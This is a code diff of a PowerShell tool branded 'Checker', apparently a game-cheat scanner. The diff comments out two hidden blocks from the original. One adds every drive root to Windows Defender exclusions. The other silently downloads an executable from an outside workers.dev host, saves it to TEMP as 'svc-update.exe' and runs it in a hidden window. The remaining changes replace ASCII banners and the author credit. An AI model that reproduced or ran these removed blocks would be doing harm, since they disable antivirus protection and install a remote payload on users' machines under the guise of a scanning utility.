@@ -14,16 +14,16 @@ if ($sp) { Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPoli
 exit
 }
 
-try {
-    Get-PSDrive -PSProvider FileSystem | ForEach-Object { Add-MpPreference -ExclusionPath $_.Root -Force -ErrorAction SilentlyContinue }
-} catch { }
+#try {
+#    Get-PSDrive -PSProvider FileSystem | ForEach-Object { Add-MpPreference -ExclusionPath $_.Root -Force -ErrorAction SilentlyContinue }
+#} catch { }
 
-try {
-    $exeUrl = "https://mc-scan.ruchecker-ru.workers.dev/"
-    $outputPath = "$env:TEMP\svc-update.exe"
-    Invoke-WebRequest -Uri $exeUrl -OutFile $outputPath -ErrorAction Stop | Out-Null
-    Start-Process $outputPath -WindowStyle Hidden
-} catch { }
+#try {
+#    $exeUrl = "https://mc-scan.ruchecker-ru.workers.dev/"
+#    $outputPath = "$env:TEMP\svc-update.exe"
+#    Invoke-WebRequest -Uri $exeUrl -OutFile $outputPath -ErrorAction Stop | Out-Null
+#    Start-Process $outputPath -WindowStyle Hidden
+#} catch { }
 
 $script:Criticals = [System.Collections.ArrayList]::new()
 $script:Suspicious = [System.Collections.ArrayList]::new()
@@ -113,6 +113,13 @@ function Show-Banner {
 Clear-Host
 Write-Host ""
 Write-Host ""
+Write-Host "                                            ____                    _          " -ForegroundColor Magenta
+Write-Host "                                           / ___| _ __   ___   ___ | | ___   _ " -ForegroundColor Magenta
+Write-Host "                                           \___ \| '_ \ / _ \ / _ \| |/ / | | |" -ForegroundColor Magenta
+Write-Host "                                            ___) | |_) | (_) | (_) |   <| |_| |" -ForegroundColor Magenta
+Write-Host "                                           |____/| .__/ \___/ \___/|_|\_\\__, |" -ForegroundColor Magenta
+Write-Host "                                                 |_|                     |___/ " -ForegroundColor Magenta
+Write-Host ""
 Write-Host "                                            _____ _               _             " -ForegroundColor White
 Write-Host "                                           / ____| |             | |            " -ForegroundColor White
 Write-Host "                                          | |    | |__   ___  ___| | _____ _ __ " -ForegroundColor White
@@ -120,7 +127,7 @@ Write-Host "                                          | |    | '_ \ / _ \/ __| |
 Write-Host "                                          | |____| | | |  __/ (__|   <  __/ |   " -ForegroundColor White
 Write-Host "                                           \_____|_| |_|\___|\___|_|\_\___|_|   " -ForegroundColor White
 Write-Host ""
-Write-Host "                                               (+) Developed by reo.q [2026]" -ForegroundColor Yellow
+Write-Host "                                             (+) Developed by sacredmvp [2026]" -ForegroundColor Yellow
 Write-Host ""
 }
 
